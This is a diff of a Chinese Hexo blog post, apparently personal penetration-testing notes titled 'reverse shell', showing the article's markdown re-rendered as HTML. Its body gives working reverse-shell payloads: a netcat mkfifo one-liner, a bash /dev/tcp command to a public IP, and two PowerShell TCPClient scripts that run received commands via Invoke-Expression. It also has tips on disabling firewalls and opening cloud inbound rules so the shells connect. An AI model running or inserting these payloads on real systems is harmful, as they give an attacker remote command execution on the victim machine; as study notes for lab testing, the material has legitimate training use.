@@ -20,20 +20,22 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="# 反弹shell  # 1kali  虽然bash反弹命令里会有&#x2F;dev&#x2F;tcp，但是其实是cd不到这个文件的  kali由于一些尚未知道的原因无法进行bash反弹shell  能够使用的命令  1rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|sh -i 2&gt;&amp;1|nc 192.168.226.129 5566 &gt;&#x2F;tmp&#x2F;f  # 2vps  外网">
+  <meta name="description" content="1kali 虽然bash反弹命令里会有&#x2F;dev&#x2F;tcp，但是其实是cd不到这个文件的 kali由于一些尚未知道的原因无法进行bash反弹shell 能够使用的命令 2vps 外网IP无法反弹shell 不能curl，也无法接收到反弹shell 在phpstorm上对受害机进行反弹shell，得到报错…">
 <meta property="og:type" content="article">
 <meta property="og:title" content="反弹shell">
 <meta property="og:url" content="http://example.com/2026/09/16/23-%E5%8F%8D%E5%BC%B9shell/index.html">
 <meta property="og:site_name" content="Glut4micum">
-<meta property="og:description" content="# 反弹shell  # 1kali  虽然bash反弹命令里会有&#x2F;dev&#x2F;tcp，但是其实是cd不到这个文件的  kali由于一些尚未知道的原因无法进行bash反弹shell  能够使用的命令  1rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|sh -i 2&gt;&amp;1|nc 192.168.226.129 5566 &gt;&#x2F;tmp&#x2F;f  # 2vps  外网">
+<meta property="og:description" content="1kali 虽然bash反弹命令里会有&#x2F;dev&#x2F;tcp，但是其实是cd不到这个文件的 kali由于一些尚未知道的原因无法进行bash反弹shell 能够使用的命令 2vps 外网IP无法反弹shell 不能curl，也无法接收到反弹shell 在phpstorm上对受害机进行反弹shell，得到报错…">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/dfda2da6-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/22ed664c-image.png">
 <meta property="article:published_time" content="2026-09-16T13:59:25.000Z">
 <meta property="article:modified_time" content="2026-09-16T13:59:25.000Z">
 <meta property="article:author" content="谷氨酸棒状杆菌">
-<meta property="article:tag" content="Web安全">
-<meta property="article:tag" content="CTF">
-<meta property="article:tag" content="学习笔记">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="反弹Shell">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/dfda2da6-image.png">
 
 <link rel="canonical" href="http://example.com/2026/09/16/23-%E5%8F%8D%E5%BC%B9shell/">
 
@@ -235,6 +237,7 @@
               <span class="post-meta-item-text">阅读次数：</span>
               <span id="busuanzi_value_page_pv"></span>
             </span>
+            <div class="post-description">1kali 虽然bash反弹命令里会有/dev/tcp，但是其实是cd不到这个文件的 kali由于一些尚未知道的原因无法进行bash反弹shell 能够使用的命令 2vps 外网IP无法反弹shell 不能curl，也无法接收到反弹shell 在phpstorm上对受害机进行反弹shell，得到报错…</div>
 
         </div>
       </header>
@@ -245,68 +248,35 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        
-# 反弹shell
-
-# 1kali
-
-虽然bash反弹命令里会有/dev/tcp，但是其实是cd不到这个文件的
-
-kali由于一些尚未知道的原因无法进行bash反弹shell
-
-能够使用的命令
-
+        <h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h1 id="1kali"><a href="#1kali" class="headerlink" title="1kali"></a>1kali</h1><p>虽然bash反弹命令里会有&#x2F;dev&#x2F;tcp，但是其实是cd不到这个文件的</p>
+<p>kali由于一些尚未知道的原因无法进行bash反弹shell</p>
+<p>能够使用的命令</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i <span class="number">2</span>&gt;&amp;<span class="number">1</span>|nc <span class="number">192.168</span>.<span class="number">226.129</span> <span class="number">5566</span> &gt;/tmp/f</span><br></pre></td></tr></table></figure>
 
-# 2vps
-
-外网IP无法反弹shell
-
-不能curl，也无法接收到反弹shell
-
-在phpstorm上对受害机进行反弹shell，得到报错内容
-
-将防火墙关闭后解决
-
+<h1 id="2vps"><a href="#2vps" class="headerlink" title="2vps"></a>2vps</h1><p>外网IP无法反弹shell</p>
+<p>不能curl，也无法接收到反弹shell</p>
+<p>在phpstorm上对受害机进行反弹shell，得到报错内容</p>
+<p>将防火墙关闭后解决</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service iptables stop</span><br><span class="line">service firewalld stop</span><br></pre></td></tr></table></figure>
 
-关掉后也curl通了
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/dfda2da6-image.png)
-
-# 3端口号
-
-查找方式
-
-linux`ifconfig`
-
-windows`ipconfig`
-
-​
-
-`bash -c "bash -i >& /dev/tcp/47.101.35.73/7777 <&1"`
-
-​
-
-# 问题：新开的阿里ECS无法进行反弹shell
-
-原因：入方向的规则进行了拦截，vps接受不到
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/22ed664c-image.png)
-
-新增配置规则以后可用
-
+<p>关掉后也curl通了</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/dfda2da6-image.png" alt="image.png"></p>
+<h1 id="3端口号"><a href="#3端口号" class="headerlink" title="3端口号"></a>3端口号</h1><p>查找方式</p>
+<p>linux<code>ifconfig</code></p>
+<p>windows<code>ipconfig</code></p>
+<p>​</p>
+<p><code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/47.101.35.73/7777 &lt;&amp;1&quot;</code></p>
+<p>​</p>
+<h1 id="问题：新开的阿里ECS无法进行反弹shell"><a href="#问题：新开的阿里ECS无法进行反弹shell" class="headerlink" title="问题：新开的阿里ECS无法进行反弹shell"></a>问题：新开的阿里ECS无法进行反弹shell</h1><p>原因：入方向的规则进行了拦截，vps接受不到</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/22ed664c-image.png" alt="image.png"></p>
+<p>新增配置规则以后可用</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$c=New-Object System.Net.Sockets.TCPClient(<span class="string">&quot;47.101.35.73&quot;</span>,<span class="number">8888</span>);$s=$c.GetStream();$w=New-Object IO.StreamWriter($s);$r=New-Object IO.StreamReader($s);$w.AutoFlush=$<span class="literal">true</span>;$w.WriteLine(<span class="string">&quot;Windows宿主机上线成功&quot;</span>);<span class="keyword">while</span>($<span class="literal">true</span>)&#123;<span class="keyword">try</span>&#123;$cmd=$r.ReadLine();<span class="keyword">if</span>(!$cmd)&#123;<span class="keyword">continue</span>&#125;;$out=Invoke-Expression $cmd <span class="number">2</span>&gt;&amp;<span class="number">1</span>|Out-String;$w.WriteLine(<span class="string">&quot;$out`nPS&gt;&quot;</span>)&#125;<span class="keyword">catch</span>&#123;$w.WriteLine(<span class="string">&quot;执行报错：$_`nPS&gt;&quot;</span>)&#125;&#125;;$c.Close()</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$c=New-Object System.Net.Sockets.TCPClient(<span class="string">&quot;47.101.35.73&quot;</span>,<span class="number">8888</span>);$s=$c.GetStream();$r=New-Object IO.StreamReader($s);$w=New-Object IO.StreamWriter($s);$w.AutoFlush=$<span class="literal">true</span>;<span class="keyword">while</span>(($cmd=$r.ReadLine())-ne $<span class="literal">null</span>)&#123;$o=(iex $cmd <span class="number">2</span>&gt;&amp;<span class="number">1</span>|Out-String);$w.WriteLine($o+<span class="string">&quot;PS&gt;&quot;</span>)&#125;;$c.Close()</span><br></pre></td></tr></table></figure>
 
-cmd不支持套字
-
----
-
-来源: https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/taq8ukm7ktp0dl5y
-语雀文档ID: 181485097
-
+<p>cmd不支持套字</p>
+<hr>
+<p>来源: <a target="_blank" rel="noopener" href="https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/taq8ukm7ktp0dl5y">https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/taq8ukm7ktp0dl5y</a><br>语雀文档ID: 181485097</p>
 
     </div>
 
@@ -316,9 +286,8 @@ cmd不支持套字
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
-              <a href="/tags/CTF/" rel="tag"># CTF</a>
-              <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag"># 学习笔记</a>
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E5%8F%8D%E5%BC%B9Shell/" rel="tag"># 反弹Shell</a>
           </div>
 
         
@@ -392,6 +361,7 @@ cmd不支持套字
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">1.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#1kali"><span class="nav-number">2.</span> <span class="nav-text">1kali</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2vps"><span class="nav-number">3.</span> <span class="nav-text">2vps</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3%E7%AB%AF%E5%8F%A3%E5%8F%B7"><span class="nav-number">4.</span> <span class="nav-text">3端口号</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%97%AE%E9%A2%98%EF%BC%9A%E6%96%B0%E5%BC%80%E7%9A%84%E9%98%BF%E9%87%8CECS%E6%97%A0%E6%B3%95%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">5.</span> <span class="nav-text">问题：新开的阿里ECS无法进行反弹shell</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -407,7 +377,7 @@ cmd不支持套字
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">72</span>
+          <span class="site-state-item-count">64</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -420,7 +390,7 @@ cmd不支持套字
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">94</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
